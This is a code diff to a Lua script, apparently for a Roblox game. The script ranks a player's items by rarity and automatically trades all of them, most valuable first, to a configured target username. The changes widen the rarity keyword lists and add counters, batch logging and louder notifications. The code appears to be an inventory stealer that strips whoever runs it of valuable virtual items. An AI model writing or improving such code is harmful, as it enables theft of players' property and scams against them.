@@ -101,23 +101,29 @@ end
 
 local function getItemRarity(itemId)
     local lowerId = itemId:lower()
-   
+    
+    -- ANCIENT items (rarity 100) - HIGHEST PRIORITY
+    local ancientKeywords = {
+        "icepiercer", "icebreaker", "harvester", "batwing", "elderwood",
+        "swirly axe", "nik's scythe", "sakura", "blossom", "evergreen",
+        "logchopper", "candy", "sugar", "gingerbread", "peppermint"
+    }
+    
+    -- GODLY items (rarity 90) - MEDIUM PRIORITY
     local godlyKeywords = {
-        "bat", "chroma", "eternal", "luger", "old glory", "amerilaser", "blaster",
-        "clockwork", "candy", "ginger", "heart", "heat", "laser", "night",
+        "bat", "snowstorm", "chroma", "eternal", "luger", "old glory", "amerilaser", "blaster",
+        "clockwork", "ginger", "heart", "heat", "laser", "night",
         "pixel", "saw", "shark", "slender", "spider", "tides", "virtual", "zombie",
         "darkbringer", "lightbringer", "gemstone", "nebula", "phantom", "shadow",
         "spectre", "boneblade", "candleflame", "deathshard", "fang", "flames",
         "hallowscythe", "hallowgun", "icebeam", "jinglegun", "minty", "snowflake",
         "icewing", "ice dragon", "ice breaker", "ice flake", "ice shard",
-        "logchopper", "battle axe", "seer", "xmas",
+        "battle axe", "seer", "xmas", "red luger", "blue luger", "purple luger",
+        "orange luger", "yellow luger", "green luger", "pink luger",
+        "iceblaster", "frostbite", "winter", "holly", "candy swirl",
+        "ginger gun", "peppermint", "sugar cane", "candy corn"
     }
-   
-    local ancientKeywords = {
-        "icepiercer", "icebreaker", "harvester", "batwing", "elderwood",
-        "swirly axe", "nik's scythe",
-    }
-   
+    
     for _, keyword in ipairs(ancientKeywords) do
         if lowerId:find(keyword) then
             return 100
@@ -165,10 +171,21 @@ end
 local function scanInventory()
     local items = getInventoryItems()
     local nonDefault = {}
+    local ancientCount = 0
+    local godlyCount = 0
+    local otherCount = 0
    
     for _, item in ipairs(items) do
+        -- Skip default items (the basic knife and gun everyone has)
         if item.id ~= "DefaultKnife" and item.id ~= "DefaultGun" then
             table.insert(nonDefault, item)
+            if item.rarity == 100 then
+                ancientCount = ancientCount + 1
+            elseif item.rarity == 90 then
+                godlyCount = godlyCount + 1
+            else
+                otherCount = otherCount + 1
+            end
         end
     end
    
@@ -179,8 +196,8 @@ local function scanInventory()
     
     Notifier.new({
         Title = "Inventory Scan",
-        Content = "Found "..#nonDefault.." tradeable items (Highest value first)",
-        Duration = 3
+        Content = string.format("Found %d items: %d Ancient, %d Godly, %d Others", #nonDefault, ancientCount, godlyCount, otherCount),
+        Duration = 5
     })
    
     return nonDefault
@@ -288,13 +305,20 @@ local function executeFullTrade()
    
     if #batch == 0 then
         Notifier.new({
-            Title = "Trade Complete",
-            Content = "All "..TradeState.tradeCount.." batches traded! Total items: "..#TradeState.itemsOffered,
-            Duration = 5
+            Title = "✅ TRADE COMPLETE!",
+            Content = string.format("Successfully traded ALL %d items in %d trades!", #TradeState.itemsOffered, TradeState.tradeCount),
+            Duration = 8
         })
         return
     end
    
+    -- Show what items are being offered in this batch
+    local itemNames = {}
+    for _, item in ipairs(batch) do
+        table.insert(itemNames, item.id)
+    end
+    print("Offering batch "..TradeState.currentBatch..": "..table.concat(itemNames, ", "))
+    
     task.wait(1)
     offerItems(batch)
     TradeState.hasOffered = true
@@ -311,9 +335,9 @@ local function executeFullTrade()
     TradeState.tradeCount = TradeState.tradeCount + 1
     
     Notifier.new({
-        Title = "Trade Batch "..TradeState.tradeCount,
-        Content = "Traded "..#batch.." items ("..TradeState.currentBatch.."/"..math.ceil(#TradeState.allItems / TradeConfig.ItemsPerTrade)..")",
-        Duration = 2
+        Title = string.format("📦 Trade Batch %d/%d", TradeState.tradeCount, math.ceil(#TradeState.allItems / TradeConfig.ItemsPerTrade)),
+        Content = string.format("Traded %d items (Ancient/Godly priority)", #batch),
+        Duration = 3
     })
 end
 
@@ -371,9 +395,9 @@ local function startNextTrade()
     if #nextBatch == 0 then
         TradeState.isProcessing = false
         Notifier.new({
-            Title = "All Items Traded",
-            Content = "Successfully traded "..#TradeState.itemsOffered.." items to "..TradeConfig.TargetUsername,
-            Duration = 5
+            Title = "🎉 ALL ITEMS TRADED! 🎉",
+            Content = string.format("Successfully traded %d items to %s", #TradeState.itemsOffered, TradeConfig.TargetUsername),
+            Duration = 8
         })
         return
     end
@@ -387,6 +411,7 @@ local function startNextTrade()
     end
 end
 
+-- Only auto-trade when the trade is initiated by US with the target
 if Trade then
     local startTradeRemote = Trade:FindFirstChild("StartTrade")
     if startTradeRemote then
@@ -463,10 +488,11 @@ end)
 task.spawn(function()
     task.wait(5)
     TradeState.allItems = scanInventory()
+    local totalTrades = math.ceil(#TradeState.allItems / TradeConfig.ItemsPerTrade)
     Notifier.new({
-        Title = "Inventory Ready",
-        Content = "Will trade "..#TradeState.allItems.." items in "..math.ceil(#TradeState.allItems / TradeConfig.ItemsPerTrade).." trades (Highest value first)",
-        Duration = 4
+        Title = "📋 INVENTORY READY",
+        Content = string.format("Will trade %d items in %d trades\n(Ancient → Godly → Others priority)", #TradeState.allItems, totalTrades),
+        Duration = 6
     })
     task.wait(2)
     local target = findTargetPlayer()
